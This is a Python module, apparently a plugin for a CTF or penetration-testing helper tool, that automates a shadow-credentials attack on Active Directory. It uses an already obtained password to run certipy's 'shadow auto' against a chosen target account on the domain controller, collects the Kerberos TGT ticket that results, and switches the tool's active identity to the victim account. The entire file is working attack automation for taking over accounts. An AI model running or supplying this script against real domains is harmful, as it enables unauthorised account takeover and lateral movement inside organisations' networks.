import subprocess
from pathlib import Path
import argparse

from core.target import target_add_cred, target_set_cred


def run(data, cred, args):
    """
    Abuse shadow credentials to get TGT via certipy

    Usage:
        ctf ad.shadowcred target_user
    """

    # -------------------------
    # Parse arguments
    # -------------------------
    extra = getattr(args, "extra", []) or []

    if len(extra) < 1:
        print("[-] Missing target user")
        return data

    target_user = extra[0]

    # -------------------------
    # Resolve target info
    # -------------------------
    ip = data.get("ip")
    domain = data.get("domain")

    if not ip:
        print("[-] Target missing IP")
        return data

    if not domain:
        print("[-] No domain set")
        return data

    # -------------------------
    # Validate credential
    # -------------------------
    if not cred:
        print("[-] No active credential")
        return data

    username = cred.get("user")
    password = cred.get("secret") if cred.get("type") == "password" else None

    if not username or not password:
        print("[-] Need password-based credential")
        return data

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "certipy",
        "shadow",
        "auto",
        "-u", f"{username}@{domain}",
        "-p", password,
        "-account", target_user,
        "-dc-ip", ip, 
        "-ldap-scheme", "ldap"
    ]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return data

    # -------------------------
    # Find generated ticket
    # -------------------------
    ccache_file = Path(f"{target_user}.ccache")

    if not ccache_file.exists():
        print("[-] Failed to obtain ticket")
        return data

    print(f"[+] Got TGT: {ccache_file}")

    # -------------------------
    # Add credential (ticket)
    # -------------------------
    target_add_cred(
        argparse.Namespace(
            user=target_user,
            password=None,
            hash=None,
            aes=None,
            ccache=str(ccache_file)
        )
    )

    # -------------------------
    # Switch active credential
    # -------------------------
    target_set_cred(
        argparse.Namespace(
            identifier=target_user
        )
    )

    print(f"[*] Switched to user: {target_user}")

    # -------------------------
    # Reload state
    # -------------------------
    from core.target import load_current_profile

    data, _ = load_current_profile()
    return data